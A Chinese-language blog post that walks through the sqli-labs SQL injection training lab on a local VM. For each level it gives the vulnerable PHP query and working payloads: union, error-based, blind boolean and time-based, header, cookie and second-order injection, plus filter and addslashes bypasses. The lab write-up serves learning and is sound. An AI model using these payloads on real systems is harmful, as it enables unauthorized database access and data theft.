---
title: sql注入
date: 2018-08-28 11:30:20
tags: sql注入,sqli-labs
---
## SQL注入
sql注入:利用现有程序，使之执行构造的payload.

### 一. 环境搭建
- ubuntu16.04虚拟机
- 更新阿里源 apt-get update
- 安装mysql apt-get install mysql-server mysql-client -y
- 安装apache apt-get install apache2 -y
- 安装git apt-get install git -y
- 项目 cd /var/www && sudo git clone https://github.com/Audi-1/sqli-labs.git sqli-labs  
- 更改项目的mysql配置文件为自己数据库
- 现在在浏览器localhost/sqli-labs已经可以访问到了

##### 问题
- navicat连不上mysql </br>
	注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1</br>
	修改select user, host from user;  update user set host = "%" where host = 'localhost';  flush privileges;
- php版本导致mysql_connect()废弃 </br>
	安装phpstorm 配置phpcgi  apt-get install php版本-cgi</br>
	降低版本到php5.6错误仍然在</br>
	第二天重启Phpstrom 打开网页，错误消失</br>
  猜测是降低版本有效，但第一天有缓存</br>
<!-- more -->
### 二.sqli-labs
参考了大牛的教程https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf

- ** less1 GET-Error based - Single quotes - String </br> **
	php中代码 SELECT * FROM users WHERE id='$id' LIMIT 0,1;
	%20 空格 %27 单引号 %3D 等于号</br>
	一：?id=(select%20id%20from%20users%20where%20username%20%3D"admin") 未成功  	’$id' 注入被单引号包裹，将输入变成了字符串</br>
	二：?id='%20and%20username%3D%27admin 未成功 id=''这个条件未绕过
	想利用id=这个条件或者绕过这个条件</br>
	三：?id='%20or%20username%3D%27admin 成功</br>
	基于二，转换思路，利用or成功绕过</br>
	爆破数据库版本</br>
	?id=-1%27%20%20union%20select%201%2cversion()%2c3%23</br>
	？id=-1'  union select 1,version(),3#</br>
	union必须列一样，所以1和3是为了保持三列

- ** less 2 GET - Error based -Intiger based</br> **
	php中代码 $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</br>
	$id未加引号过滤输入</br> ?id=(select%20id%20from%20users%20where%20username%20%3D"admin")成功注入

- ** less 3 GET - Error based - single quotes with twist - string**</br>
	php中代码 $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; 用括号和单引号进行了过滤</br>
	思路：消除括号</br>
	?id=%27)or%20username%3D%27admin%27or%20(%27  成功


- ** less 4  GET - Error based - Double Quotes - String ** </br>
	php中代码</br>
	$id = '"' . $id . '"';</br>
	$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";</br>
	?id=%27)or%20username%3D%27admin%27or%20(%27 成功</br>

    关于前四个less的一些心得：
    	1.找错误：
    		尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题
    		例：?id="
    				 返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""") LIMIT 0,1' at line 1
    			可以看出输入所在位置为（“输入”）
    	2.注入利用
    		通过union来执行自己想要的sql

- ** less 5  GET - Double Injection - Single Quotes - String ** </br>
双查询注入（双查询：select嵌套select）</br>
	输入?id=‘ 失败， use near 1  由此猜测为单引号</br>
	?id='%20or%20username%3D%27admin 成功 </br>
	但是sql执行结果前端并没有进行输出，怎么利用？</br>

	查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（\*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</br>
	发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）</br>
	count() 计数</br>
	rand() 随机</br>
	group by 分组</br>
	floor() 向下取整，舍弃小数部分</br>

	?id=-1%27%20union%20select%201%2c(select%20count(\*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\*2)))%2c3%20%23 成功</br>
	Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''
	其中version(）是我们希望执行的函数，可以换成其它

- ** less 6 GET - Double Injection - Double Quotes - String ** </br>

	?id=-1%22%20union%20select%201%2c(select%20count(\*)%20from%		20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)\*2)))%2c3%20%23 成功

- ** less 7 GET - Dump into outfile - String ** </br>
	文件导入限制条件多，未成功

- ** less 8 GET - Blind - Boolian Based - Single Quotes ** </br>
	?id=-1%27or%201%3d1%23 </br>
	利用二分与返回结果的正确与否，来猜测验证数据库内容

- ** less 9 GET - Blind - Time Based - Single Quotes ** </br>
	?id=1%27%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23 </br>
	因为在这正确或者错误都是返回的"you are in" 所以不能区分 </br>
  ![youarein](../images/youarein.png)
	使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试

- ** less 10 GET -Blind - Time Based - Double Quotes ** </br>
	?id=1"%20and%20if(ascii(substr(database(),1,1))>116,%200,%20sleep(5))%20%23

- ** less 11 POST - Error Based -Single Qoutes - String ** </br>
	username:  
      1.admin ' # admin用户</br>
      2.adimn ' or 1=1 # 万能</br>
      3. ' union select version(),1 # 等其它操作
	passwd:
    因为username已经用#将后面注释了，所以passwd随意输入

- ** less 12 POST - Error Based - Double Quotes - String - with twist ** </br>
将less11的单引号改为 “）

- ** less 13 POST - Double Injection - Single quotes - String - with twist ** </br>
	username:    ') union select (select count(\*) from information_schema.schemata group by concat(version(),floor(rand(0)\*2))),1 #</br>
	返回信息Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key ''</br>
	另外这种有正确/错误提示的，都可以二分盲注来猜测验证

- ** less 14 POST  - Double Injection - Double quotes - String ** </br>
	less13 ') 换为 ”

- ** less 15 POST - Blind - Boolean/Time Based -Single Quotes ** </br>
	username: ' or 1=1 # 登录成功 </br>
	思路：利用or/and/if sleep()等来进行猜测</br>

- ** less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist ** </br>
	将less15 ' 换成 ")

- ** less 17 POST - Update Query - Error Based - String ** </br>
	这里对用户名进行了过滤</br>
	利用报错进行注入输出 </br>
	uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&sub mit=Submit </br>
	输出结果XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'</br>
  报错注入基本都是利用XPath进行报错
	有必要去买本书来系统的看一下mysql各种函数

- ** less 18 POST - Header Injection - Uagent field - Error Based ** </br>
	这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后</br>
	php中语句：$insert="INSERT INTO \`security\`.\`uagents\` (\`uagent\`, \`ip_address\`, \`username\`) VALUES ('$uagent', '$IP', $uname)";</br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent</br>
	将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’</br>
	返回结果：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'

- ** less 19 POST - Header Injection - Referer Field - Error Based ** </br>
	同less 18,进行了过滤，但执行了$insert="INSERT INTO \`security\`.\`referers\` (\`referer\`, \`ip_address\`) VALUES ('$uagent', '$IP')";</br>
	其中：$uagent = $\_SERVER['HTTP_REFERER'];</br>
	将Referer 修改为: 'or extractvalue(1,concat(0x7e,database())) or'</br>
	返回: XPATH syntax error: '~security'

- ** less 20 POST - Cookie Injection - Uagent Field - Error Based ** </br>
	进行了过滤</br>
	$cookee = $\_COOKIE['uname'];</br>
	$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";</br>
	流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)</br>
	修改Cookie为： uname=-1' union select 1,(select version()),3 #</br>
	返回 ：
           Your Login name:5.7.23-0ubuntu0.16.04.1
		   Your Password:3
		   Your ID:1
	也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>
	 uname=admin'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# </br>
	返回:Issue with your mysql: XPATH syntax error: '~/usr/~'

- ** less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String ** </br>
	setcookie('uname', base64_encode($row1['username']), time()+3600);
	$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";</br>
	对Cookie 进行了 base64处理 </br>
	uname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj
	uname=-1') union select 1,(select version()),3 #</br>
	返回：</br>
  Your Login name:5.7.23-0ubuntu0.16.04.1</br>
	 Your Password:3</br>
	Your ID:1

- ** less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String ** </br>
	对Cookie进行了base64编码，使用的双引号

----------------------------------------------------------------------

- ** less 23 GET - Error Based - Strip Comments ** </br>
	php中处理：</br>
	$reg = "/#/";</br>
	$reg1 = "/--/";</br>
	$replace = "";</br>
	$id = preg_replace($reg, $replace, $id); //将$reg替换为$replace</br>
	$id = preg_replace($reg1, $replace, $id);</br>
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</br>
	因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等</br>
	?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27</br>
	返回：</br>
  Your Login name:5.7.23-0ubuntu0.16.04.1</br>
	Your Password:3

- ** less 24 POST - Second Order Injection \*Real treat\* - Stored Injections ** </br>
	本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入</br>
	php中:</br>
      $sql = "select count(\*) from users where username='$username'";
		  $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
		  $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
		  $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
	先注册一个admin'#用户，更改其密码，实际上是更改的admin的密码

- **less 25 GET - Error Based - All your OR & AND Belong to us - String - Single Quotes**</br>
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)</br>
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)</br>
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</br>
	思路：使用union
	绕过过滤：
        （1）大小写变形 Or,OR,oR
		（2）编码，hex，urlencode
		（3）添加注释/*or*/
		（4）利用符号 and=&& or=||
	?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23
	返回：XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1'

- **less 25a GET - Blind Based - All your OR & AND Belong to us - String - Single Quotes** </br>
	$id= blacklist($id);</br>
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</br>
	//print_r(mysql_error()); </br>
	报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤</br>
	?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)</br>
  然后依次这样，查出数据库名

- **less 26 GETs - Error Based - All your Spaces and Comments Belong to us** </br>
	Comments 注释</br>
	php中:</br>
	   function blacklist($id)
	    {
		$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
		$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
		$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
		$id= preg_replace('/[--]/',"", $id);		//Strip out --
		$id= preg_replace('/[#]/',"", $id);			//Strip out #
		$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
		$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
		return $id;
	   }
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</br>
	思路：</br>
  注释过滤了可以手动闭合引号，空格过滤
	可以使用  %a0  换行，</br>
  /\**/ 注释， （） 括号等绕过空格</br>
	此处注释不能使用，为了使用select时去掉末尾引号，空格也不行</br>
	id='111'union(select(1),(version()),(3)） ' LIMIT 0,1; 使用括号时，引号还在</br>
	?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功

- **less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis** </br>
	过滤和less26相同</br>
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";</br>
	?id=111%27)union%a0select%a01%2cversion()%2c3||(%271</br>

	思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&</br>
	?id=1%27%26%26%271=1 猜测为’ ‘</br>
	?id=1%27)%26%26(%271=1 猜测为（’ ‘）</br>
	?id=1%22%26%26%221=1 猜测为 " "</br>
	?id=1%22)%26%26(%221=1 猜测为(" ")</br>
	?id=1)%26%26(1=1  猜测为()</br>
	?id=1%26%261=1 无</br>
等诸如此类</br>

- **less 27 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes**</br>
  	function blacklist($id)
  	{
  	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
  	$id= preg_replace('/[--]/',"", $id);		//Strip out --.
  	$id= preg_replace('/[#]/',"", $id);			//Strip out #.
  	$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
  	$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
  	$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
  	$id= preg_replace('/union/s',"", $id);	    //Strip out union
  	$id= preg_replace('/select/s',"", $id);	    //Strip out select
  	$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
  	$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
  	$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
  	$id= preg_replace('/Select/s',"", $id);	    //Strip out select
  	return $id;
  	}

	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</br>

	思路一：大小写绕过</br>
	?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27</br>
	思路二：报错或延时？

- **less 27a GET - Blind Based - All your UNION & SELECT Belong to us -Double Quotes**</br>
	1.?id=1%22%26%26%221=1 成功，猜测为“ "过滤</br>
	2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入</br>

- **less 28 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes with Parentesis**</br>
  	function blacklist($id)
  	{
  	$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
  	$id= preg_replace('/[--]/',"", $id);				//Strip out --.
  	$id= preg_replace('/[#]/',"", $id);					//Strip out #.
  	$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
  	$id= preg_replace('/select/m',"", $id);	   		 	Strip out spaces.
  	$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
  	$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
  	return $id;
  	}
	   $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27

  - **less 28a GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes - Parentesis**</br>
    	function blacklist($id)
    	{
    	$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out spaces.
    	return $id;
    	}
    	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同

- **less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application**</br>
服务器（两层架构）</br>
	当?id=1&id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容</br>
	此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 </br>
	?id=1&id=-2%27union%20select%201,user(),version()%27</br>
	返回:</br>
  Your Login name:root@localhost</br>
	Your Password:5.7.23-0ubuntu0.16.04.1

- **less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web**</br>
	?id=1&id=-2%22union%20select%201,user(),version()%22

- **less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web** </br>
	?id=1&id=-2")union%20select%201,user(),version()%23

- **less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars**</br>
宽字节注入</br>
	原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \ 除掉。</br>
  一般有两种思路： </br>
	1、%df 吃掉 \ 具体的原因是 urlencode(‘\) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。</br>
	2、将 \’ 中的 \ 过滤掉， 例如可以构造 %\**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</br>

	addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：'   "  \</br>
	addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行
  	function check_addslashes($string)
  	{
  		$string= addslashes($string);    
  		return $string;
  	}
	例?id=-1%27%20union%20select%201,version(),user()%20%27</br>
	The filtered request is :-1\' union select 1,version(),user() \'</br>

	?id=-1%df%27%20union%20select%201,version(),user()%23</br>
	返回:</br>
  Your Login name:5.7.23-0ubuntu0.16.04.1</br>
	Your Password:root@localhost

- **less 33 GET -  Bypass AddSlashers()**</br>
	?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样

- **less 34 POST - Bypass AddSlashers()**</br>
	post型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为' 。我们就 可以利用这个方式进行尝试。</br>

	運' or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c </br>
	SELECT username, password FROM users WHERE username='運\' or 1=1# ' and password='' LIMIT 0,1

- **less 35 GET - Bypass Add Slashes(we dont need them) Integer Based**</br>
	php中：$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</br>
	可以看出，不需要构造特殊符号</br>
	?id=-1%20union%20select%201,version(),user()%23</br>

- **less 36 GET - Bypass mysql_real _escape _string**</br>
	mysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符</br>
	string 必需，要转义的字符串</br>
	connection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接</br>
  	\x00  ascii码 null
  	\n	换行
  	\r	回车
  	\
  	'
  	"
  	\x1a （即十进制26）&
	这些字符会被转义</br>

  	function check_quotes($string)
  	{
  		$string= mysql_real_escape_string($string);    
  		return $string;
  	}
  	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

	?id=-1%df%27%20union%20select%201,version(),user()%23 成功

- **less 37 POST - Bypass mysql_real_escape_string** </br>
	運' or 1=1 #

---------------------------------------------------

Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 </br>
原理:</br>
在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 </br>
局限:</br>
堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 </br>
虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。
因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</br>

暂不深入了解

---------------------------------------------
challenge

- **GET - challenge - Union -10 Queries Allowed - Variation1**</br>
	1.查表名</br>
	?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>
	得到此次的表名: 8TELU525VO</br>
	2.查列名 用concat一次性查完输出</br>
	?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23</br>
	返回:</br>
  Your Login name:id---,sessid---,secret_63JY---,tryy---</br>
	Your Password:3</br>
	3.得到密码id,sessid,secret_63JY</br>
	?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23</br>
	返回:</br>
  Your Login name:856213ca887976a33e3d91b2c61fa65a</br>
	Your Password:M5ztHsC34iN2X0lzCiXJ27Cp</br>
	4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成

- **GET - Challenge - Union - 14 Queries Allowed - Variation 2**</br>
	1.猜测过滤规则</br>
	当输入?id=1)%26%26(1=1 时 成功 可知过滤为()</br>
	2.参考less 54</br>
	?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>
	表名为: C73JPUKYS9	</br>
	?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d
	%22C73JPUKYS9%22),3%20%23</br>
	列名: Your Login name:id---,sessid---,secret_DH0J---,tryy---</br>
	?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23</br>
	密码：</br>
  Your Login name: 4d0218b33a232f675d53381ef38b5370</br>
  Your Password: kjbKG19I62vmYE3kS7gGN7qf </br> 成功

- **GET - Challenge - Union - 14 Queries Allowed - Variation 3**</br>
	1.猜测</br>
	?id=1%27)%26%26(%271=1 成功 可知为(' ')</br>
	2.下面步骤如上</br>

- **GET - Challenge - Union - 14 Queries Allowed - Variation 4**</br>
	如上

- **GET - Challenge - Double Query -5 Queries Allowed - Variation 1**</br>
	1.猜测</br>
	?id=1%27%26%26%271=1 成功，可知为' '</br>
	?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 </br>  返回同上，可知有其它过滤规则</br>
	尝试报错注入</br>
	?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()</br>
	2.获取表名</br>
	?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23</br>
	返回：XPATH syntax error: '~4HT916R6T1~'</br>
	3.获取列名</br>
	?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,"---")%20from%20information_schema.columns%20where%20table_name%3d%20"4HT916R6T1"),0x7e),1),1%23</br>
	返回: XPATH syntax error: '~id---,sessid---,secret_EN0R---,'为什么有一个列没显示</br>
	4.获取密码</br>
	?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23</br>
	返回: XPATH syntax error: '~OcDGOovBkd3XMq3FpuSNtEIN~'</br>

- **GET - Challenge - Double Query -5 Queries Allowed - Variation 2**</br>
	?id=1%26%261=1 返回成功，说明无字符</br>
	剩余步骤如 less 58</br>

-  **GET - Challenge - Double Query -5 Queries Allowed - Variation 3**
	?id=1%22%26%26%221=1 猜测为 " "</br>
?id=1%22)%26%26(%221=1 猜测为(" ") </br>
都返回相同结果？？？？</br>
  但实际上
        	$id = '("'.$id.'")';
  			$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
  	           if($row)
  				{
  					echo '<font color= "#00FFFF">';
  					$unames=array("Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4");
  					$pass = array_reverse($unames);
  					echo 'Your Login name : '. $unames[$row['id']];
  					echo "<br>";
  					echo 'Your Password : ' .$pass[$row['id']];
  					echo "</font>";
  				}
  				else
  				{
  					echo '<font color= "#FFFF00">';
  					print_r(mysql_error());
  					echo "</font>";  
  				}
	每次返回都是$unames=array（），奸诈！！

- **GET - Challenge - Double Query -5 Queries Allowed - Variation 4**</br>
	$sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";

- **GET - Challenge - Blind -130 Queries Allowed - Variation 1**</br>
	盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率</br>
	?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))--+

### 三.杂记

- 盲注</br>
	语句执行完后没有回显</br>
	1.基于布尔</br>
	构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）</br>
	2.基于报错</br>
	SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)\*2));</br>
	[Err] 1062 - Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key '<group_key>'</br>
	具体原理不懂，concat, floor, group by，rand(0)是关键</br>
	如果rand被禁用可以使用用户变量来报错？？</br>
	或者XPath报错等</br>
	3.基于时间-延迟注入</br>
	利用if,当条件正确或错误时，确定要不要sleep()来猜测</br>

- insert/update/delete注入</br>
	思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>

-	order by</br>
	可以用来确定有几列，如 order by 4 ,报错没有第四列</br>

- url编码
  	空格    -    %20
  	"          -    %22
  	#         -    %23
  	%        -    %25
  	&         -    %26
  	(          -    %28
  	)          -    %29
  	+         -    %2B
  	,          -    %2C 逗号
  	/          -    %2F
  	:          -    %3A
  	;          -    %3B
  	<         -    %3C
  	=         -    %3D
  	>         -    %3E
  	?         -    %3F
  	@       -    %40
  	\          -    %5C
  	|          -    %7C
  	'               %27  单引号

- 补充一些数据库知识</br>
  	infomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。
  	如数据库名，数据库的表，表栏的数据类型与访问权限等。</br>
  	再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，
  	每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</br>

  	information_schema的表schemata中的列schema_name记录了所有数据库的名字
  	information_schema的表tables中的列table_schema记录了所有数据库的名字
  	information_schema的表tables中的列table_name记录了所有数据库的表的名字
  	information_schema的表columns中的列table_schema记录了所有数据库的名字
  	information_schema的表columns中的列table_name记录了所有数据库的表的名字
  	information_schema的表columns中的列column_name记录了所有数据库的表的列的名字
查询指定数据库所有表名</br>
SELECT table_name FROM information_schema.tables WHERE table_schema='数据库名';</br>
查询mysql中所有数据库名字</br>
SELECT schema_name FROM information_schema.schemata</br>

	version()  mysql版本
	user()用户
	@@datadir数据路径
	@@version_compile_os 操作系统
	database() 数据库名字
	SELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();
--+/# 注释，一般用#，url编码为%23</br></br>
mysql中XPath:</br>
MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</br>
ExtractValue():</br>
	EXTRACTVALUE (XML_document, XPath_string); </br>
	第一个参数：XML_document是String格式，为XML文档对象的名称</br>
	第二个参数：XPath_string (Xpath格式的字符串) </br>
	作用：从目标XML中返回包含所查询值的字符串</br>
UpdateXml():</br>
	UPDATEXML (XML_document, XPath_string, new_value); </br>
	第一个参数：XML_document是String格式，为XML文档对象的名称</br>
	第二个参数：XPath_string (Xpath格式的字符串) </br>
	第三个参数：new_value，String格式，替换查找到的符合条件的数据 </br>
	作用：改变文档中符合条件的节点的值 </br>
通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</br>
0x7E为~的ascii码</br></br>
if</br>
IF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3</br></br>
concat() 连接字符串，将多个连接在一起。</br>
	concat(str1,str2,...)</br>
concat_ws() 将多个字符串连接在一起，可以一次性指定分隔符</br>
	concat_ws(sparator, str1,str2,...)</br>
group_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果</br>
	group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )</br>





- 问题：</br>
1.怎么确定是哪种注入类型？</br>
2.在没有返回值的情况下判断单引号双引号括号等

- 其它
  	?id=1%27%26%26%271=1 猜测为’ ‘
  	?id=1%27)%26%26(%271=1 猜测为（’ ‘）
  	?id=1%22%26%26%221=1 猜测为 " "
  	?id=1%22)%26%26(%221=1 猜测为(" ")
  	?id=1)%26%26(1=1  猜测为()
  	?id=1%26%261=1 无
